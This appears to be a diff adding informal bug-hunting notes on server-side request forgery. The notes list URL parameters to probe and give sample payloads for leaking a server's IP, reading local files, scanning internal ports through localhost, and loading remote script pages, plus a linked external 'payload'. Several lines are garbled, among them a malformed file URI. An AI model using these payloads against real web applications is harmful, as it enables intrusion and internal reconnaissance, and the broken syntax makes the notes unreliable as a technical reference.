@@ -1,0 +1,31 @@
+Server Side Request Forgery (SSRF) refers to an attack where in an attacker
+is able to send a crafted request from a vulnerable web application.
+
+
+You have to find any parameter that may have some kind of external interaction 
+or they can interact to external domain
+Example :- Any.com/index/php?uri=http://external.com
+
+Possible Related parameter to Hunt for SSRF
+dest, redirect ,url, path ,Continue ,url ,window,
+next, data, reference, site, html, val ,validate,      
+domain ,callback, return ,pageview ,dir ,show ,
+file ,document, folder ,root ,path ,pg ,style  
+pdf ,template ,php_path, doc, feed ,host port   to   out   navigation   open   result       
+
+1. Attack : aread the Files 
+target :- find url,site,file... then -> reapeter  
+example : ?file=http://anywebsite.com         // the anywebsite will get ip vurnable webite in logs
+example : ?file= file///:idn   // send to intruder and test the idn 
+ payload : https://drive.google.com/file/d/1mjvLqbkYEH2FYWFHS_F34aTQfHjYMzMh/view?usp=sharing
+
+2. Attack : scan the Internal Network 
+target :- ?file=http://localhost:25      //try 0 to any no. after localhost it is port 
+
+3. Attack : ssrf with rfi
+target :- ?file=http://anywebsite/code.html  ->ok  //code.html contain <script>alert()</script>  
+// if target will execute it is cause dangous harm
+
+
+
+
